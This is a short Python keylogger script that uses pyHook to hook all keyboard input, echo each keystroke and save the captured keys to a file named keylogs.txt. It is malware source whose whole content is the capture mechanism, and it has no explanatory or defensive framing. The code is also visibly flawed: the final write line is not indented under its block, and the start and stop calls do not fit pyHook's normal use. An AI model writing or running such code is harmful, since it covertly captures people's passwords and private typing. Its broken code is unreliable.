import pyHook, pythoncom
h = pyHook.HookManager()
keylogs = []

def OnKeyboardEvent(event):
	if event.Ascii in range(32, 127) or event.Ascii == 0:
		if len(str(event.Key)) > 1:
			thekey = str(event.Key)
		else:
			thekey = chr(event.Ascii)
		print(thekey, end='')
		keylogs.append(thekey)
	return True

h.KeyDown = OnKeyboardEvent
h.HookKeyboard()
try:
	h.start()
except KeyboardInterrupt:
	h.stop()
with open('keylogs.txt', 'w') as f:
f.write(''.join(keylogs))
